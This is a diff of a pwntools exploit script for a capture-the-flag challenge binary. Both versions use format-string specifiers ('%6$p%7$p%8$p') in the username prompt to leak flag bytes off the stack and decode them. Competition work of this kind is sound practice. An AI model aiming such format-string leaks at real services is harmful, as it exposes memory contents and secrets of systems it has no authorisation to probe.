@@ -1,32 +1,24 @@
 from pwn import *
 
+context.arch = 'amd64'
 context.log_level = 'debug'
 context.terminal = ['tmux', 'splitw', '-h']
 
-p = gdb.debug('./chall', '''
-    b main
+p = gdb.debug('./chall_patched', '''
+    b *(main+381)
     continue
 ''')
 
 # p = remote('chall.lac.tf', 31142)
 
-p.sendlineafter(b'username: ', b"%p%p%p%p%p%p%p%p")
-p.sendlineafter(b'password1: ', b"\n")
-p.sendlineafter(b'password2: ', b"\n")
-
-p.recvuntil(b'user ')
-value = p.recvuntil(b'\n').decode().strip()
-hex_flag = [
-    int(value[-52:-34], 16),
-    int(value[-34:-16], 16),
-    int(value[-16:], 16)
-]
-
-flag = ""
-for hex_flag_part in hex_flag:
-    hex_bytes = hex_flag_part.to_bytes((hex_flag_part.bit_length() + 7) // 8, byteorder='little')
-    ascii_str = hex_bytes.decode('ascii')
-    flag += ascii_str
+# leak flag on stack using format string
+p.sendlineafter(b"username: ", b'%6$p%7$p%8$p')
+p.sendlineafter(b"password1: ", b"A")
+p.sendlineafter(b"password2: ", b"A")
+p.recvuntil(b"Incorrect password for user ")
+leak = p.recvline().strip()
+flag_hex = [int(leak[0:18], 16), int(leak[18:36], 16), int(leak[36:54], 16)]
+flag = ''.join(struct.pack('<Q', val).decode('ascii') for val in flag_hex)
 print(flag)
 
 p.interactive()
